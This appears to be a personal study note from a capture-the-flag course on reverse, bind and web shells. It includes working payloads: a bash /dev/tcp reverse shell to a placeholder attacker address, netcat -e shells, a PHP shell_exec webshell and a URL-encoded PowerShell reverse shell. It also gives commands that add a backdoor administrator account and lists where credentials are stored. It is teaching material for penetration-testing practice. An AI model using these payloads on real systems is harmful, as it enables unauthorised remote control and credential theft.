```

		░██     ░██            ░██ ░██                   ░██                
		░██     ░██            ░██ ░██                                      
		░██     ░██  ░███████  ░██ ░████████   ░███████  ░██░█████████████  
		░██████████ ░██    ░██ ░██ ░██    ░██ ░██    ░██ ░██░██   ░██   ░██ 
		░██     ░██ ░█████████ ░██ ░██    ░██ ░█████████ ░██░██   ░██   ░██ 
		░██     ░██ ░██        ░██ ░██    ░██ ░██        ░██░██   ░██   ░██ 
		░██     ░██  ░███████  ░██ ░██    ░██  ░███████  ░██░██   ░██   ░██

```


# What are shells?
---

Shells are what we use when we interact with command-line interfaces (CLI), such as bash, and zsh on linux, and Powershell on Windows. 

When targeting remote systems we can sometimes force an app running on the server to execute arbitrary code.

We want to then use this initial access to run a shell on the target.

We can trick the remote server to send us CLI access to the server (reverse shell),
Or to open up a port on the server which we can connect to (bind shell)

## Reverse shells vs Binding shells
---

### Reverse Shells

- Victim connects to attacker
- used to bypass firewalls that block incoming connections
- Example: ```bash -i >& /dev/tcp/(attacker_ip)/attacker_port 0>&1``` on the target machine, then run ```nc -lvnp (port_number)``` on the attacker machine

**Breaking down the commands**

 1️⃣ `bash -i`

- `-i`: **interactive mode**
    
- Starts an interactive bash shell so it behaves like a real terminal. 
---
 2️⃣ `>&/dev/tcp/(attacker_ip)/(attacker_port)`

- `/dev/tcp/` is a **special Bash feature**:
    
    - When you reference `/dev/tcp/IP/PORT`, Bash opens a TCP connection to that host/port.
        
- `>&`: redirects **both stdout and stderr** to that connection.  
    📡 So all the command output goes over the network to the attacker.
---
 3️⃣ `0>&1`

- `0>` Means **stdin** (keyboard input).
    
- `&1`: ties stdin to stdout (the TCP socket).  
    📥 This makes your attacker’s keystrokes get sent into the shell.

---
🏴‍☠️ **Effect**

The attacker can listen on the specified port and run commands on the victim box as if they're logged in

### Binding Shells
---
- Attacker connects to victim
- Example: `nc -l -p port` on the victim machine and then `nc attacker_ip port`

## General requirements 
--- 
In order to generate shells we need two things:

- Malicious code to generate the shell
- And a way to interface with the shell resulting from the code

## Common Tools
---
### 1 - Netcat

Netcat is used to perform all kinds of network interactions, like banner grabbing during enumeration, but it can also be used to receive reverse shells and connect to remote ports generated and attached to bind shells on the target system 

### Pros
- Easy Syntax
- Preinstalled on most linux distros
### Cons
- very unstable
- can be improved by certain techniques

The syntax for starting a netcat listener using Linux is this:

`nc -lvnp <port-number>`

- **-l** is used to tell netcat that this will be a listener
- **-v** is used to request a verbose output
- **-n** tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
- **-p** indicates that the port specification will follow.

It's generally good practice to use well known port numbers such as 80, 443 or 53 as this is more likely to bypass outbound firewall rules

<center>note that any port below 1024 requires sudo</center>

### Netcat shell stabilisation

Connecting a netcat shell is a great first step, but often the shells we catch are non-interactive shells, which are very unstable. This is largely due to netcat shells being technically processes running inside a terminal rather than a full-fledged terminal shell. We'll be discussing the many ways to stabilize our shells on wndows or linux targets.

---
### Python technique (Linux only)

This technique is only applicable to Linux targets as they always have python installed by default as opposed to Windows.

 - ### First step:
 We use `python3 -c 'import pty;pty.spawn("/bin/bash")`

if python3 isn't installed try using python

 ✅ `-c`

Tells Python to **run the following code as a command string** (instead of executing a script file).

> It's short for **command**, like:  
> `python -c 'print("hi")'`

---

 ✅ `'import pty; pty.spawn("/bin/bash")'`

This is the actual Python code you’re running.

Let’s split it:

---

🧠 `import pty`

This imports the **`pty` module**, which stands for **Pseudo-Terminal**.

- A **PTY** is like a fake terminal that can behave like a real terminal (TTY).
    
- This is **essential for running interactive commands** (`nano`, `passwd`, tab-completion, etc.) in a shell you’ve popped through a reverse connection.
    

---

🧠 `pty.spawn("/bin/bash")`

This spawns a **new bash shell**, but — crucially — **binds it to a proper PTY**.

- It **upgrades** your dumb, raw shell into an **interactive** one.
    
- It lets your keystrokes be interpreted properly.
    
- Without it, things like `Ctrl+C`, arrow keys, or `read` don’t behave correctly.
    

---

🔥 Why this matters in hacking

When you get a reverse shell (say, via `nc -e`), it’s often **non-interactive** and fragile.

Running this command inside that shell turns it into something more like a real terminal — letting you:

- Run interactive commands
    
- Use arrow keys, tab completion, Ctrl+C, etc.
    
- Avoid `/dev/tty` errors

### Second step

then we run `export TERM=xterm`

🔍 Line-by-Line Breakdown:

### 🧱 `export`

- This is a **bash built-in** used to **make a variable available to all child processes** (like `vim`, `less`, or anything spawned from this shell).
    
- Without `export`, the variable would be limited to the current shell session only.
    

👉 Think of it as saying:  
**“Hey, future processes — here's a variable you need to know about.”**

---

### 🧱 `TERM`

- This is a special environment variable that tells programs **what kind of terminal emulator** you're using.
    
- Programs like `top`, `vim`, `less`, `man`, and even bash itself use `TERM` to:
    
    - Render colors
        
    - Handle key bindings (e.g., arrows, Ctrl+C)
        
    - Move the cursor
        
    - Support full-screen modes
        

---

### 🧱 `xterm`

- This is one of the **most common terminal types**.
    
- It supports:
    
    - 256 colors
        
    - Cursor movement
        
    - Control sequences
        
    - Everything you'd want in a **reverse shell environment**
        

👀 If you're in a reverse shell and don’t set `TERM` correctly, you'll see:

- Weird `TERM unknown` errors
    
- Broken arrow keys or delete
    
- `vim` or `top` refusing to launch
    
- Garbled output
    

### Third (and most important) step

We'll background the shell using ctrl+Z. and in our own terminal we will use `stty raw -echo; fg`

  🔧 `stty`

- Stands for **Set TTY** settings.
    
- Modifies how your terminal handles **keyboard input/output**.
    

---

 🧱 `raw`

- Tells the shell to **send your keystrokes directly to the process**, _without processing_ them first.
    
- Disables line buffering, Ctrl+C interpretation, etc.
    

💡 Without `raw`, typing characters might:

- Be **delayed**
    
- Echo twice
    
- Not even reach the shell
    

---

🧱 `-echo`

- **Disables echoing** your keystrokes back to your screen.
    
- Useful to **avoid double-typed input** or weird characters showing up.
    

🧠 You’re basically saying:

> “Stop interpreting or echoing my input — just send it straight through to bash.”

---

 🧱 `;`

Just a command separator — lets you chain another command.

---

 🧱 `fg`

- Brings the **`bash` shell (or any backgrounded job)** back to the **foreground**.
    
- This is needed if the reverse shell got "suspended" with `Ctrl+Z` earlier (which you _often do to run `stty` locally first).

![[Shell-stabilization.png]]
<center>Full stabilization process here img taken from THM</center>

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.

---
## Second technique: **rlwrap** (great for windows)

rlwrap (readline wrapper) is a Linux utility that adds features like history, line editing and tab completion to your unstable shells. It doesn't traditionally come with linux distros so you have to install it `sudo apt install rlwrap` 

to invoke a rlwrap listener we use `rwlrap nc -lvnp (port)`

---
## Third technique: Socat (Linux only)

This method is among the easiest ways to stabilize your netcat shell 

---
### 2- Socat

Socat is exactly like Netcat, but it can establish more stable shells

### Pros
- Incredible stability
- More features 

### Cons
- Difficult syntax
- Very rarely installed on distros
---
### [3 - MsfVenom](Muspelheim.md#MsfVenom)

--- 
### [4 - Multi/Handler](Muspelheim.md#Multi/Handler)


## Great online resources
---
### [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) / [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

A curated guide to internal network penetration testing, covering Active Directory exploitation, privilege escalation, lateral movement, and post-exploitation techniques. Perfect for red teamers operating inside corporate environments. Great for finding shell code.

---
### [Reverse Shell Cheatsheat](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

A compact collection of ready-to-use reverse shell payloads for a variety of languages and tools, including Bash, Python, PHP, and Netcat. Essential for quickly gaining command-line access during exploitation and post-exploitation phases.

---
## Types of shells

 - Reverse shells are the most common and easier to execute
 - Bind shells are less common but still very useful to know

### Reverse shell example

**on the attacker machine:

	sudo nc -lvnp 443

**on the target machine:

	nc (LOCAL-IP) (PORT) -e /bin/bash


### Binding shell example

**on the target machine:

	nc -lvnp (port) -e "cmd.exe"
	
 ✅ `-e "cmd.exe"`:

- **`-e`**: This flag tells Netcat to **execute a program** when a connection is made.
    
- **`"cmd.exe"`**: This is the **program to be executed** — in this case, **the Windows command prompt**.

💡 What it _actually does_:

When someone connects to that `nc` listener (on the port you chose), Netcat will:

> **Give the connecting user direct access to `cmd.exe`**, the Windows shell.

That means the connecting client can now:

- Run shell commands
    
- Navigate the file system
    
- Spawn processes
    
- Do **anything** the Netcat process has permission to do
    

It’s like handing them a terminal.

**on the attacking machine:

	nc machine_ip (port)
---
### Interactive vs Non-Interactive shells

  - ### **Interactive shells**
Shells such as Powershell, Bash, or Zsh. Basically the classic shells that we're all used to when running any kind of terminal. They allow you to interact with the programs after you execute them.

For example:

![[Interactive-shell-example.png]]
<center>Image taken from THM</center>

Here the program actively asks for user input. This is called an **interactive** program and can only run properly on interactive shells.


 - ### **Non-Interactive shells**

 These types of shells are much less stable and usable than the interactive ones, and our reverse and bind shells are usually always going to be non-interactive. We can still execute non-interactive commands pretty well, but it starts to get messy when we try runnning any kind of interactive command such as ssh.

---
## 🧠 TL;DR:

> When you run an **interactive command** (like `top`, `nano`, `passwd`, etc.) in a **non-interactive shell**, it typically **fails or behaves weirdly**, because it **can't access a TTY** (terminal interface) to draw its UI or receive input.

---

## 🔍 What’s going on under the hood?

### 🔹 What is an **interactive command**?

These are commands that:

- Require **real-time input** (like typing into `nano`)
    
- Or use **screen control** (like `top` refreshing every second)
    
- Or use **raw terminal modes** (like `passwd` hiding your keystrokes)
    

They need a **proper TTY (or PTY)** — not just stdin/stdout.

---

### 🔹 What is a **non-interactive shell**?

- A shell launched without a TTY (e.g., via `nc -e /bin/bash`)
    
- It **lacks the "terminal layer"** that interactive commands expect
    
- stdin, stdout, and stderr may be piped over TCP instead of being tied to an actual screen+keyboard
    

---

### 🔥 So what happens?

Here’s how it plays out:

|Command|In a Proper Terminal|In a Non-interactive Shell|
|---|---|---|
|`ls`|Works fine|Works fine|
|`cat file`|Works fine|Works fine|
|`top`|Shows live UI|Fails or prints garbage|
|`nano`|Full text editor|Fails or gets stuck|
|`passwd`|Prompts for password|Says "cannot open /dev/tty"|
|`read`|Works|Might hang or fail silently|

Commands that try to **read from the terminal directly** (like `passwd`) will usually return:

	passwd: cannot open /dev/tty: no such device or address
	
Or the output might go **nowhere useful** because the program is trying to draw to a screen that doesn’t exist.

---
## Webshells

Webshells are primarily used for when we have a file upload vulnerability, and it's sometimes not possible to activate a reverse or bind shell.

Webshells run on the webserver which executes on the server, so the commands are entered into the webpage which are then executed by the script and returns results to the page, usually helping us step into a fully fledged reverse or bind shell.

The most famous format for a webshell is:

	<?php echo "<pre>" . shell_exec($_GET["cmd"] . "</pre>"; ?>

Here's the breakdown for this command

### ✅ `<?php`

👨‍💻 Starts a **PHP code block**.  
Everything between `<?php` and `?>` is interpreted by the server as PHP.

---

### ✅ `echo ...`

📤 **Echoes (outputs)** the result to the browser.  
Used to display content (like text, HTML, or command output).

---

### ✅ `"<pre>" . ... . "</pre>"`

🖼️ Wraps the output inside an HTML `<pre>` tag:

- Preserves **line breaks, tabs, spacing** — makes output look like a terminal.  
    🧾 Makes command output readable and clean.
    

---

### ✅ `shell_exec(...)`

💣 **Executes a shell command** on the server.  
🧨 Whatever command you give it, PHP runs it in the **system’s terminal**, then returns the output.

---

### ✅ `$_GET["cmd"]`

🌐 Takes the `cmd` parameter from the **URL query string**.  
Example:  
`http://target.com/shell.php?cmd=whoami`  
🔗 `"whoami"` is passed into `shell_exec()`.

---

### ✅ So altogether:

🕸️ It takes the attacker’s command from the URL,  
🧠 runs it on the server,  
📤 and sends the output back in your browser  
💻 formatted like a terminal using `<pre>`.

This will execute the GET parameter in the URL into the system using

		shell_exec()

![[thm_webshells.png]]
<center>Image taken from THM 'what the shell' lab</center>

This is an example of executing the ifconfig command on the server. On kali linux you can find a variety of webshells at /usr/share/webshells .

When the target is windows it's easiest to obtain RCE using webshell or msfvenom generated shells, windows webshells can be obtained with a URL encoded Powershell reverse shell such as:

	powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
	

The URL encoding allows for this shell to be used safely in a GET parameter.

---
<center>**Now the following paragraph is taken from THM**</center>

Ok, we have a shell. Now what?  
  
We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`  
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`
